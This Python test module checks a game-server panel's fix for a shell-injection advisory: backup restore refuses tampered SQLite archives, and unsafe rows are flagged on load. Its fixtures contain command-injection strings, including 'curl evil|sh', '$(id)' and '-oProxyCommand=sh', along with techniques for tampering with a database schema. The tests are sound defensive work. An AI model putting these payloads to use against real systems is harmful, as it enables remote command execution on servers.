"""Part 9 of the unit suite: GHSA-hh39-76g3-wxcx, the data layer. Imported for its side effects."""
# 3. DATA LAYER: a backup whose database carries an unsafe account, script, login or port is
# refused before anything is touched, and a clean one still restores; a row LOADED with one is
# flagged, not fatal. tests/unit/part07.py says what GHSA-hh39-76g3-wxcx was and holds the gates;
# part08 each converted function's behaviour.
import ast as _gh_ast
import io as _gh_io
import logging as _gh_logging
import shutil as _gh_shutil
import sqlite3 as _gh_sqlite
import tarfile as _gh_tar
import tempfile as _gh_tmp

from cryptography.fernet import Fernet as _GhFernet
from sqlalchemy import create_engine as _gh_engine
from sqlalchemy.orm import Session as _GhSession

from unit.part01 import _sm_core, _sm_game, check, os, re  # noqa: E402
from unit import REPO_ROOT as _gh_root  # noqa: E402
from unit.part07 import _gh_callee  # noqa: E402
from unit.part08 import _GH_SRV, _gh_run, _gh_sent, _is_tuple_refusal  # noqa: E402

from panel.db import models as _gh_models  # noqa: E402
from panel.ops import backup as _gh_bk  # noqa: E402

_gh_dir = _gh_tmp.mkdtemp(prefix="lgsm-ghsa-")


def _gh_make_db(path, game_rows=(), remote_rows=()):
    """A real panel.db — the models' own schema — with rows written RAW, past @validates."""
    # Raw, the way a hand edit or a tampered archive would put them there: @validates never sees them.
    eng = _gh_engine("sqlite:///" + path)
    _gh_models.db.metadata.create_all(eng)
    eng.dispose()
    con = _gh_sqlite.connect(path)
    for rid, username in remote_rows:
        con.execute("INSERT INTO remote_server (id, name, host, port, username, linuxgsm_user) "
                    "VALUES (?, 'h', 'h', 22, ?, '')", (rid, username))
    for gid, short_name, game_type, port in game_rows:
        con.execute("INSERT INTO game_server (id, remote_id, name, short_name, game_type, port) "
                    "VALUES (?, 1, 'g', ?, ?, ?)", (gid, short_name, game_type, port))
    con.commit()
    con.close()


# ── restore: the archive's rows are checked before anything is touched ──────────────────────────
_GH_BK_ATTRS = ("BACKUP_DIR", "DATA_DIR", "DB_PATH", "CONFIG_FILE", "SECRET_FILE", "CRED_KEY_FILE",
                "_helper_present", "_run_verb", "create_backup", "get_passphrase")
_gh_bk_saved = {a: getattr(_gh_bk, a) for a in _GH_BK_ATTRS}
_gh_archive_key = _GhFernet.generate_key()
_gh_live_key = _GhFernet.generate_key()          # a DIFFERENT key: the archive's own must be used
_gh_seq = [0]


def _gh_enc(value, key=_gh_archive_key):
    """`value` as the panel stores an encrypted column, under `key` (the archive's, by default)."""
    return "enc:v1:" + _GhFernet(key).encrypt(value.encode()).decode()


def _gh_archive(db_bytes_or_rows, cred_key=_gh_archive_key):
    """Write a backup archive into the redirected BACKUP_DIR; returns its name."""
    _gh_seq[0] += 1
    name = "panel-backup-20260926-1200%02d-manual.tar.gz" % _gh_seq[0]
    work = _gh_tmp.mkdtemp(dir=_gh_dir)
    dbp = os.path.join(work, "panel.db")
    if isinstance(db_bytes_or_rows, bytes):
        with open(dbp, "wb") as f:
            f.write(db_bytes_or_rows)
    else:
        _gh_make_db(dbp, **db_bytes_or_rows)
    members = {"panel.db": open(dbp, "rb").read(), "config.json": b"{}",
               "secret_key": b"s"}  # nosec B105 - a fixture archive's placeholder member, never read
    if cred_key is not None:
        members["cred_key"] = cred_key
    with _gh_tar.open(os.path.join(str(_gh_bk.BACKUP_DIR), name), "w:gz") as tar:
        for mname, data in members.items():
            ti = _gh_tar.TarInfo(mname)
            ti.size = len(data)
            tar.addfile(ti, _gh_io.BytesIO(data))
    return name


_gh_calls = []
_gh_data = os.path.join(_gh_dir, "data")
_gh_stage = os.path.join(_gh_data, ".restore-stage")
# A tuple, so that _gh_db can take it as a default: a default argument is built once and shared.
_GH_OK_REMOTE = ((1, _gh_enc("admin")),)


def _gh_redirect_backup():
    """Point panel.ops.backup at a throwaway data dir holding a live panel.db; -> that db's bytes."""
    os.makedirs(os.path.join(_gh_data, "backups"), mode=0o700)
    _gh_bk.DATA_DIR = type(_gh_bk.DATA_DIR)(_gh_data)
    _gh_bk.BACKUP_DIR = _gh_bk.DATA_DIR / "backups"
    _gh_bk.DB_PATH = _gh_bk.DATA_DIR / "panel.db"
    _gh_bk.CONFIG_FILE = _gh_bk.DATA_DIR / "config.json"
    _gh_bk.SECRET_FILE = _gh_bk.DATA_DIR / "secret_key"
    _gh_bk.CRED_KEY_FILE = _gh_bk.DATA_DIR / "cred_key"
    _gh_bk.CRED_KEY_FILE.write_bytes(_gh_live_key)
    _gh_make_db(str(_gh_bk.DB_PATH), game_rows=[(1, "livesrv", "csgo", 27015)])
    live_bytes = _gh_bk.DB_PATH.read_bytes()
    _gh_bk._helper_present = lambda: True
    _gh_bk._run_verb = lambda verb, args, **k: (_gh_calls.append(("verb", verb)), ("", "", 0))[1]
    _gh_bk.create_backup = lambda kind="manual", encrypt=True, passphrase=None: (
        _gh_calls.append(("safety", kind)), (True, "panel-backup-20260926-000000-prerestore.tar.gz"))[1]
    _gh_bk.get_passphrase = lambda: ""
    return live_bytes


def _gh_restore(rows_or_bytes, **kw):
    """restore_backup() of a new archive of `rows_or_bytes`, the recorder and staging emptied first."""
    _gh_calls.clear()
    _gh_shutil.rmtree(_gh_stage, ignore_errors=True)
    return _gh_bk.restore_backup(_gh_archive(rows_or_bytes, **kw))


_GH_ROW_CASES = [
    ("an injected game server account", {"game_rows": [(7, "x; curl evil|sh; #", "csgo", 27015)],
                                         "remote_rows": _GH_OK_REMOTE}, "game server #7 (short_name)"),
    ("an injected LinuxGSM script name", {"game_rows": [(8, "gmodserver", "gmod$(id)", 27015)],
                                          "remote_rows": _GH_OK_REMOTE}, "game server #8 (game_type)"),
    ("an SSH login that is an ssh OPTION, encrypted with the ARCHIVE's key",
     {"game_rows": [], "remote_rows": [(3, _gh_enc("-oProxyCommand=sh"))]}, "host #3 (username)"),
    ("a port stored as text", {"game_rows": [(9, "gmodserver", "gmod", "27015; id")],
                               "remote_rows": _GH_OK_REMOTE}, "game server #9 (port)"),
    ("an account stored as a BLOB", {"game_rows": [(10, b"gmodserver", "gmod", 27015)],
                                     "remote_rows": _GH_OK_REMOTE}, "game server #10 (short_name)"),
    ("two bad rows, the SECOND named too", {"game_rows": [(21, "a;b", "gmod", 27015), (22, "c;d", "gmod", 27016)],
                                            "remote_rows": _GH_OK_REMOTE}, "game server #22 (short_name)"),
]


def _gh_check_bad_rows(live_bytes):
    """Each archive carrying an unsafe row is refused, naming it, before anything is touched."""
    for what, rows, named in _GH_ROW_CASES:
        ok, msg = _gh_restore(rows)
        check("GHSA-hh39 restore: a backup carrying %s is refused, naming the row" % what,
              ok is False and named in msg and "Nothing on this panel was changed" in msg,
              "%r %r" % (ok, msg))
        check("GHSA-hh39 restore: ...before the safety copy, the staging or the swap (%s)" % what,
              _gh_calls == [] and not os.path.exists(_gh_stage)
              and _gh_bk.DB_PATH.read_bytes() == live_bytes,
              "calls=%r staged=%r" % (_gh_calls, os.path.exists(_gh_stage)))


def _gh_check_readable_and_keys():
    """An unreadable database is refused; clean ones restore, checked with the key the panel keeps."""
    ok, msg = _gh_restore(b"this is not a sqlite database at all" * 40)
    check("GHSA-hh39 restore: a database SQLite cannot read is refused (it cannot be checked)",
          ok is False and "could not be read" in msg and _gh_calls == [], "%r %r" % (ok, msg))
    # The controls: the check is not a blanket refusal.
    ok, msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015), (2, "cs2srv", "cs2", 27016)],
                           "remote_rows": [(1, _gh_enc("admin")), (2, "legacyplain")]})
    check("GHSA-hh39 restore: a clean backup still restores — safety copy, staging and the verb run",
          ok is True and _gh_calls == [("safety", "prerestore"), ("verb", "panel-restore")]
          and os.path.exists(os.path.join(_gh_stage, "panel.db")), "%r %r %r" % (ok, msg, _gh_calls))
    ok, msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015)],
                           "remote_rows": [(1, _gh_enc("-oProxyCommand=sh", _gh_live_key))]})
    check("GHSA-hh39 restore: a value the restored key cannot decrypt is unreadable after the restore "
          "too, and does not block it", ok is True, "%r %r" % (ok, msg))
    ok, msg = _gh_restore({"game_rows": [(1, "gmodserver", "gmod", 27015)],
                           "remote_rows": [(1, _gh_enc("-oProxyCommand=sh", _gh_live_key))]},
                          cred_key=None)
    check("GHSA-hh39 restore: an archive with no cred_key is checked with the key the panel keeps",
          ok is False and "host #1 (username)" in msg, "%r %r" % (ok, msg))


def _gh_archive_with_cred_key_of(member_type):
    """An archive with no cred_key file, then given a cred_key member of tar type `member_type`."""
    name = _gh_archive({"game_rows": [(1, "gmodserver", "gmod", 27015)],
                        "remote_rows": [(1, _gh_enc("-oProxyCommand=sh", _gh_live_key))]},
                       cred_key=None)
    path = os.path.join(str(_gh_bk.BACKUP_DIR), name)
    with _gh_tar.open(path, "r:gz") as tin:
        keep = [(m, tin.extractfile(m).read()) for m in tin.getmembers()]
    with _gh_tar.open(path, "w:gz") as tout:
        for m, data in keep:
            tout.addfile(m, _gh_io.BytesIO(data))
        ti = _gh_tar.TarInfo("cred_key")
        ti.type = member_type
        ti.linkname = "nowhere" if member_type == _gh_tar.SYMTYPE else ""
        tout.addfile(ti)
    return name


def _gh_check_odd_cred_key(live_bytes):
    """A cred_key member that is not a regular file is refused before anything is touched."""
    # The extraction copies only regular members, so the swap keeps the LIVE key — while the check,
    # reading the same member, got no key at all and skipped every encrypted value as "unreadable
    # after the restore too". The live key reads it: measured, the restored panel's ORM served this
    # login unchanged.
    for kind, member_type in (("a directory", _gh_tar.DIRTYPE), ("a symlink", _gh_tar.SYMTYPE)):
        name = _gh_archive_with_cred_key_of(member_type)
        _gh_calls.clear()
        _gh_shutil.rmtree(_gh_stage, ignore_errors=True)
        ok, msg = _gh_bk.restore_backup(name)
        check("GHSA-hh39 restore: a cred_key member that is %s is refused before anything is "
              "touched (the swap would keep the live key the check never decrypted with)" % kind,
              ok is False and _gh_calls == [] and not os.path.exists(_gh_stage)
              and _gh_bk.DB_PATH.read_bytes() == live_bytes,
              "%r %r calls=%r" % (ok, msg, _gh_calls))


def _gh_check_old_db():
    """A database from before these tables existed is not refused for lacking them."""
    _gh_calls.clear()
    _gh_shutil.rmtree(_gh_stage, ignore_errors=True)
    path = os.path.join(_gh_dir, "old.db")
    con = _gh_sqlite.connect(path)
    con.execute("create table t(x)")
    con.commit()
    con.close()
    ok, msg = _gh_restore(open(path, "rb").read())
    check("GHSA-hh39 restore: a database from before these tables existed is not refused for it",
          ok is True, "%r %r" % (ok, msg))


# ── review F2: the check must read the database the way SQLite will serve it ────────────────
# SQLite resolves table and column names case-INSENSITIVELY and sqlite_master keeps whatever
# spelling a table was created with. The first version looked 'game_server' / 'short_name' up
# by exact name, so an archive spelling them "GAME_SERVER" / "SHORT_NAME" skipped the check
# entirely — and the ORM's `FROM game_server` read that table anyway. Every other way a
# value the panel later reads could differ from the one checked is refused as well.
def _gh_db(game_rows=(), remote_rows=_GH_OK_REMOTE, sql=(), writable=()):
    """The bytes of a panel.db with these rows, after `sql`, then `writable` (writable_schema on)."""
    path = os.path.join(_gh_tmp.mkdtemp(dir=_gh_dir), "panel.db")
    _gh_make_db(path, game_rows=game_rows, remote_rows=remote_rows)
    con = _gh_sqlite.connect(path)
    for stmt in sql:
        con.execute(stmt)
    con.commit()
    if writable:
        con.execute("PRAGMA writable_schema=ON")
        for stmt in writable:
            con.execute(stmt)
        con.commit()
    con.close()
    with open(path, "rb") as f:
        return f.read()


# SQLite refuses to rename a table or column to another case of its own name (to SQLite that
# IS its own name), so the fixtures go through a temporary one.
def _gh_retable(old, new):
    """The statements that rename table `old` to `new`, by way of a temporary name."""
    return ['ALTER TABLE "%s" RENAME TO ghsa_tmp' % old, 'ALTER TABLE ghsa_tmp RENAME TO "%s"' % new]


def _gh_recol(table, old, new):
    """The statements that rename `table`.`old` to `new`, by way of a temporary name."""
    return ['ALTER TABLE "%s" RENAME COLUMN "%s" TO ghsa_tmp' % (table, old),
            'ALTER TABLE "%s" RENAME COLUMN ghsa_tmp TO "%s"' % (table, new)]


_GH_PAYLOAD = "x; touch /tmp/ghsa-f2; #"
_GH_CLEAN = [(15, "gmodserver", "gmod", 27015)]


def _gh_check_f2_case():
    """F2: a table or column spelled in another case is resolved as SQLite resolves it."""
    cases = [
        ("an UPPER-CASE table", "game server #11 (short_name)",
         _gh_db([(11, _GH_PAYLOAD, "csgo", 27015)], sql=_gh_retable("game_server", "GAME_SERVER"))),
        ("an UPPER-CASE column", "game server #12 (short_name)",
         _gh_db([(12, _GH_PAYLOAD, "csgo", 27015)],
                sql=_gh_recol("game_server", "short_name", "SHORT_NAME"))),
        ("a Mixed-Case table AND column", "game server #13 (game_type)",
         _gh_db([(13, "gmodserver", "gmod$(id)", 27015)],
                sql=_gh_retable("game_server", "Game_Server")
                + _gh_recol("Game_Server", "game_type", "Game_Type"))),
        ("an upper-case HOST table, its login encrypted with the archive's key", "host #3 (username)",
         _gh_db([], remote_rows=[(3, _gh_enc("-oProxyCommand=sh"))],
                sql=_gh_retable("remote_server", "REMOTE_SERVER")
                + _gh_recol("REMOTE_SERVER", "username", "UserName"))),
        ("an upper-case PORT column holding text", "game server #14 (port)",
         _gh_db([(14, "gmodserver", "gmod", "27015; id")],
                sql=_gh_recol("game_server", "port", "PORT"))),
    ]
    for what, named, db in cases:
        ok, msg = _gh_restore(db)
        check("GHSA-hh39 restore F2: %s is resolved as SQLite resolves it, and its bad row refused"
              % what, ok is False and named in msg and _gh_calls == [],
              "%r %r calls=%r" % (ok, msg, _gh_calls))


# Shapes that let a value CHANGE after the check read it, or hide one from it. Every row in
# these archives is clean: what is refused is the shape. (The SQL here CRAFTS a tampered archive:
# the payload is spliced into it on purpose, and nothing from outside the test reaches it.)
_GH_F2_SHAPES = [
    ("a trigger that rewrites a game server's account after the panel inserts one", "trigger",
     _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t AFTER INSERT ON game_server BEGIN "  # nosec B608 - crafted fixture
                            "UPDATE game_server SET short_name = '%s' WHERE id = NEW.id; END"
                            % _GH_PAYLOAD])),
    ("a trigger on ANOTHER table that rewrites one when the panel logs anything", "trigger",
     _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t2 AFTER INSERT ON audit_log BEGIN "
                            "UPDATE game_server SET game_type = 'gmod$(id)'; END"])),
    ("a VIEW standing in for the game_server table", "view",
     _gh_db(_GH_CLEAN, sql=["ALTER TABLE game_server RENAME TO gs_real",
                            "CREATE VIEW game_server AS SELECT * FROM gs_real"])),
    ("an account COMPUTED from a column the panel updates on every poll", "computes",
     _gh_db([], sql=["DROP TABLE game_server",
                     "CREATE TABLE game_server (id INTEGER PRIMARY KEY, remote_id INTEGER, "
                     "status VARCHAR(32), game_type VARCHAR(64), port INTEGER, query_port INTEGER, "
                     "short_name TEXT GENERATED ALWAYS AS (CASE status WHEN 'online' THEN '%s' "
                     "ELSE 'gmodserver' END) VIRTUAL)" % _GH_PAYLOAD,
                     "INSERT INTO game_server (id, remote_id, status, game_type, port) "
                     "VALUES (15, 1, 'offline', 'gmod', 27015)"])),
    ("a game_server table with no game_type column", "no game_type column",
     _gh_db(_GH_CLEAN, sql=["ALTER TABLE game_server DROP COLUMN game_type"])),
    # An index whose entries disagree with its table: the TABLE holds a clean account and the
    # index the payload, so a covering read (`SELECT short_name … WHERE remote_id = ?`) gets
    # the payload while a check reading the table sees 'gmodserver'. Only SQLite's own
    # integrity check notices.
    ("an index whose entries disagree with its table", "integrity check",
     _gh_db(_GH_CLEAN, sql=["UPDATE game_server SET name = '%s'" % _GH_PAYLOAD,  # nosec B608 - crafted fixture
                            "CREATE INDEX ix_ghsa ON game_server (remote_id, name)"],
            writable=["UPDATE sqlite_master SET sql = 'CREATE INDEX ix_ghsa ON game_server "
                      "(remote_id, short_name)' WHERE name = 'ix_ghsa'"])),
    # ...and the other way round, the shape that beat a check reading through the index: the
    # table holds the payload and the index a clean name.
    ("an index hiding the table's payload from a covering read", "integrity check",
     _gh_db([(15, _GH_PAYLOAD, "gmod", 27015)],
            sql=["UPDATE game_server SET name = 'gmodserver'",
                 "CREATE INDEX ix_ghsa ON game_server (remote_id, name)"],
            writable=["UPDATE sqlite_master SET sql = 'CREATE INDEX ix_ghsa ON game_server "
                      "(remote_id, short_name)' WHERE name = 'ix_ghsa'"])),
    ("the same account computed and STORED (recomputed on every UPDATE as well)", "computes",
     _gh_db([], sql=["DROP TABLE game_server",
                     "CREATE TABLE game_server (id INTEGER PRIMARY KEY, remote_id INTEGER, "
                     "status VARCHAR(32), game_type VARCHAR(64), port INTEGER, query_port INTEGER, "
                     "short_name TEXT GENERATED ALWAYS AS (CASE status WHEN 'online' THEN '%s' "
                     "ELSE 'gmodserver' END) STORED)" % _GH_PAYLOAD,
                     "INSERT INTO game_server (id, remote_id, status, game_type, port) "
                     "VALUES (15, 1, 'offline', 'gmod', 27015)"])),
    # A trigger whose CREATE carries a comment that says TABLE. SQLite reads past a comment to
    # what the statement creates, and so must the check: a reader that stopped inside the comment
    # would take this for a table. SQLite writes its own "CREATE TRIGGER …" into sqlite_master, so
    # the comment is put back by hand — as a crafted archive would.
    ("a trigger whose CREATE hides behind a /* TABLE */ comment", "trigger",
     _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t3 AFTER INSERT ON audit_log BEGIN "
                            "UPDATE game_server SET game_type = 'gmod$(id)'; END"],
            writable=["UPDATE sqlite_master SET sql = replace(sql, 'CREATE TRIGGER', "
                      "'CREATE /* TABLE */ TRIGGER') WHERE name = 'ghsa_t3'"])),
    ("a trigger whose CREATE hides behind a -- TABLE line comment", "trigger",
     _gh_db(_GH_CLEAN, sql=["CREATE TRIGGER ghsa_t4 AFTER INSERT ON audit_log BEGIN "
                            "UPDATE game_server SET game_type = 'gmod$(id)'; END"],
            writable=["UPDATE sqlite_master SET sql = replace(sql, 'CREATE TRIGGER', "
                      "'CREATE -- TABLE' || char(10) || 'TRIGGER') WHERE name = 'ghsa_t4'"])),
]


def _gh_check_f2_shapes(live_bytes):
    """F2: each shape that could change or hide a value is refused, and the refusal says why."""
    for what, says, db in _GH_F2_SHAPES:
        ok, msg = _gh_restore(db)
        check("GHSA-hh39 restore F2: %s is refused, and says why" % what,
              ok is False and says in msg and "Nothing on this panel was changed" in msg
              and _gh_calls == [] and _gh_bk.DB_PATH.read_bytes() == live_bytes,
              "%r %r calls=%r" % (ok, msg, _gh_calls))


def _gh_check_index_fixture():
    """(fixture) Through the panel's own SQLite, the covering read and the table disagree."""
    # That disagreement is what the integrity check is for.
    probe = os.path.join(_gh_tmp.mkdtemp(dir=_gh_dir), "probe.db")
    with open(probe, "wb") as f:
        f.write(_GH_F2_SHAPES[5][2])
    con = _gh_sqlite.connect(probe)
    try:
        cover = con.execute("SELECT short_name FROM game_server WHERE remote_id = 1").fetchall()
        table = con.execute("SELECT short_name FROM game_server NOT INDEXED").fetchall()
    finally:
        con.close()
    check("GHSA-hh39 restore F2: (fixture) that index really does answer with a different account",
          cover == [(_GH_PAYLOAD,)] and table == [("gmodserver",)],
          "covering=%r table=%r" % (cover, table))


def _gh_check_f2_controls():
    """F2 controls: a clean archive restores, and the case check is not a spelling check."""
    # A clean table in another case is read, not refused.
    ok, msg = _gh_restore(_gh_db(_GH_CLEAN, sql=_gh_retable("game_server", "GAME_SERVER")))
    check("GHSA-hh39 restore F2: (control) a CLEAN upper-case table is read and passes",
          ok is True, "%r %r" % (ok, msg))
    ok, msg = _gh_restore(_gh_db(_GH_CLEAN))
    check("GHSA-hh39 restore F2: (control) a clean archive with the panel's own schema still restores",
          ok is True and _gh_calls == [("safety", "prerestore"), ("verb", "panel-restore")],
          "%r %r %r" % (ok, msg, _gh_calls))


# The tuple backup.py checks must be every column models.py guards with _validate_shell_ident,
# or a column added there later is checked on assignment and never on restore.
def _gh_tablename(cls):
    """The table of model class `cls`: its __tablename__, or its name in snake_case (Flask-SQLAlchemy)."""
    return next((getattr(t.value, "value", None) for t in cls.body
                 if isinstance(t, _gh_ast.Assign) and any(getattr(x, "id", "") == "__tablename__" for x in t.targets)),
                None) or re.sub(r"(?<!^)(?=[A-Z])", "_", cls.name).lower()


def _gh_validated_keys(m):
    """The column names method `m` is registered for with @validates(...)."""
    return [a.value for d in m.decorator_list if isinstance(d, _gh_ast.Call)
            and _gh_callee(d) == "validates" for a in d.args if isinstance(a, _gh_ast.Constant)]


def _gh_calls_shell_ident(m):
    """Does method `m` call _validate_shell_ident?"""
    return any(isinstance(c, _gh_ast.Call) and _gh_callee(c) == "_validate_shell_ident"
               for c in _gh_ast.walk(m))


def _gh_guarded_columns():
    """{(table, column)} whose @validates method in models.py calls _validate_shell_ident."""
    with open(os.path.join(_gh_root, "panel", "db", "models.py"), encoding="utf-8") as f:
        tree = _gh_ast.parse(f.read())
    guarded = set()
    for cls in [n for n in tree.body if isinstance(n, _gh_ast.ClassDef)]:
        for m in cls.body:
            if isinstance(m, _gh_ast.FunctionDef) and _gh_calls_shell_ident(m):
                guarded |= {(_gh_tablename(cls), k) for k in _gh_validated_keys(m)}
    return guarded


def _gh_check_guarded_columns():
    """Restore checks exactly the columns models.py guards as shell identifiers."""
    guarded = _gh_guarded_columns()
    check("GHSA-hh39 restore: it checks exactly the columns models.py guards as shell identifiers",
          guarded and guarded == set(_gh_bk._RESTORE_IDENT_COLUMNS),
          "models: %r / backup: %r" % (sorted(guarded), sorted(_gh_bk._RESTORE_IDENT_COLUMNS)))


try:
    _gh_live_bytes = _gh_redirect_backup()
    _gh_check_bad_rows(_gh_live_bytes)
    _gh_check_readable_and_keys()
    _gh_check_odd_cred_key(_gh_live_bytes)
    _gh_check_old_db()
    _gh_check_f2_case()
    _gh_check_f2_shapes(_gh_live_bytes)
    _gh_check_index_fixture()
    _gh_check_f2_controls()
    _gh_check_guarded_columns()
finally:
    for _gh_a, _gh_v in _gh_bk_saved.items():
        setattr(_gh_bk, _gh_a, _gh_v)

# ── load: a row @validates never saw is FLAGGED, not fatal, and not rewritten ────────────────────
_gh_logdb = os.path.join(_gh_dir, "load.db")
_gh_make_db(_gh_logdb, game_rows=[(1, "x; id > /tmp/pwned; #", "gmod", 27015),
                                  (2, "gmodserver", "gmod", 27016),
                                  # review F3: a port stored as TEXT, and one stored as a numeric
                                  # string (which SQLite's INTEGER affinity turns into a number).
                                  (3, "gmodserver3", "gmod", "27017; touch /tmp/ghsa-f3; true"),
                                  (4, "gmodserver4", "gmod", "27018")])
_gh_warned = []


class _GhLogCatch(_gh_logging.Handler):
    def emit(self, record):
        if record.levelno >= _gh_logging.WARNING:
            _gh_warned.append(record.getMessage())


_gh_handler = _GhLogCatch()
_gh_models._log.addHandler(_gh_handler)
_gh_models._flagged_on_load.clear()
_gh_eng = _gh_engine("sqlite:///" + _gh_logdb)
_gh_loaded, _gh_load_exc = None, None
try:
    with _GhSession(_gh_eng) as _gh_sess:
        _gh_row = _gh_sess.get(_gh_models.GameServer, 1)
        _gh_clean = _gh_sess.get(_gh_models.GameServer, 2)
        _gh_loaded = (_gh_row.short_name, _gh_row.lgsm_name, _gh_clean.short_name)
    with _GhSession(_gh_eng) as _gh_sess:                  # a second load, a fresh session
        _gh_sess.get(_gh_models.GameServer, 1)
except Exception as _e:
    _gh_load_exc = _e
finally:
    _gh_models._log.removeHandler(_gh_handler)
    _gh_eng.dispose()
check("GHSA-hh39 load: a row with an unsafe account name LOADS — the panel is not bricked by it",
      _gh_load_exc is None and _gh_loaded is not None, repr(_gh_load_exc))
check("GHSA-hh39 load: ...unchanged (never silently rewritten to some other account)",
      _gh_loaded is not None and _gh_loaded[0] == "x; id > /tmp/pwned; #", repr(_gh_loaded))
check("GHSA-hh39 load: ...and flagged ONCE, naming the row and the column — the clean row is not",
      len(_gh_warned) == 1 and "GameServer #1" in _gh_warned[0] and "short_name" in _gh_warned[0],
      repr(_gh_warned))
# Ports are flagged by TYPE (review F3): text where a number belongs, never a numeric value.
_gh_warned.clear()
_gh_models._log.addHandler(_gh_handler)
_gh_port_loaded = None
try:
    with _GhSession(_gh_eng) as _gh_sess:
        _gh_port_loaded = (_gh_sess.get(_gh_models.GameServer, 3).port,
                           _gh_sess.get(_gh_models.GameServer, 4).port)
except Exception as _e:
    _gh_port_loaded = _e
finally:
    _gh_models._log.removeHandler(_gh_handler)
    _gh_eng.dispose()
check("GHSA-hh39 load F3: a port stored as text loads unchanged and is flagged once, by row and "
      "column; a numeric one is not",
      _gh_port_loaded == ("27017; touch /tmp/ghsa-f3; true", 27018) and len(_gh_warned) == 1
      and "GameServer #3" in _gh_warned[0] and " port " in _gh_warned[0]
      and "not a plain number" in _gh_warned[0], "%r %r" % (_gh_port_loaded, _gh_warned))
# ...and the enforcement is the builder: the loaded row's names drive no command.
_gh_sent.clear()
_gh_saved_rc = _sm_core.run_command
try:
    _sm_core.run_command = _gh_run
    _gh_rc = _sm_core.run_as_game_user(_GH_SRV, _gh_loaded[0] if _gh_loaded else "x;id", "details",
                                       selfname=_gh_loaded[1] if _gh_loaded else "x")
    _gh_cc = _sm_game.capture_console(_GH_SRV, _gh_loaded[0] if _gh_loaded else "x;id",
                                      _gh_loaded[1] if _gh_loaded else "x")
except Exception as _e:        # a raise is not a refusal: fail the check below, by name
    _gh_rc = _gh_cc = repr(_e)
finally:
    _sm_core.run_command = _gh_saved_rc
check("GHSA-hh39 load: ...and the LOADED row's names drive no command at all",
      not _gh_sent and _is_tuple_refusal(_gh_rc) and _is_tuple_refusal(_gh_cc),
      "%r %r %r" % (_gh_sent[:1], _gh_rc, _gh_cc))
# ...and EVERY watched column, on BOTH models. The checks above load GameServer.short_name and
# .port only, so dropping the RemoteServer listener, or any other column from the two lists, passed.
_gh_all_db = os.path.join(_gh_dir, "load_all.db")
_gh_make_db(_gh_all_db)
_gh_ac = _gh_sqlite.connect(_gh_all_db)
_gh_ac.execute("INSERT INTO remote_server (id, name, host, port, username, linuxgsm_user) VALUES "
               "(5, 'h', 'h', 22, '-oProxyCommand=x', ''), (6, 'h', 'h', 22, 'admin', 'a b'), "
               "(7, 'h', 'h', '22; id', 'admin', '')")
_gh_ac.execute("INSERT INTO game_server (id, remote_id, name, short_name, game_type, port, query_port) "
               "VALUES (5, 5, 'g', 'gm5', 'gmod$(id)', 27015, NULL), "
               "(6, 5, 'g', 'gm6', 'gmod', 27016, '27017; id')")
_gh_ac.commit()
_gh_ac.close()
_gh_warned.clear()
_gh_models._flagged_on_load.clear()
_gh_models._log.addHandler(_gh_handler)
_gh_eng2 = _gh_engine("sqlite:///" + _gh_all_db)
_gh_all_exc = None
try:
    with _GhSession(_gh_eng2) as _gh_sess:
        for _gh_cls, _gh_id in ((_gh_models.RemoteServer, 5), (_gh_models.RemoteServer, 6),
                                (_gh_models.RemoteServer, 7), (_gh_models.GameServer, 5),
                                (_gh_models.GameServer, 6)):
            _gh_sess.get(_gh_cls, _gh_id)
except Exception as _e:
    _gh_all_exc = _e
finally:
    _gh_models._log.removeHandler(_gh_handler)
    _gh_eng2.dispose()
_gh_want = [("RemoteServer #5", " username "), ("RemoteServer #6", " linuxgsm_user "),
            ("RemoteServer #7", " port "), ("GameServer #5", " game_type "),
            ("GameServer #6", " query_port ")]
_gh_missing = [w for w in _gh_want if not any(w[0] in m and w[1] in m for m in _gh_warned)]
check("GHSA-hh39 load: every watched column is flagged on BOTH models — a host's login, LinuxGSM "
      "account and ssh port, a game server's script and query port",
      _gh_all_exc is None and not _gh_missing and len(_gh_warned) == len(_gh_want),
      "raised=%r missing=%r warned=%r" % (_gh_all_exc, _gh_missing, _gh_warned))
_gh_shutil.rmtree(_gh_dir, ignore_errors=True)
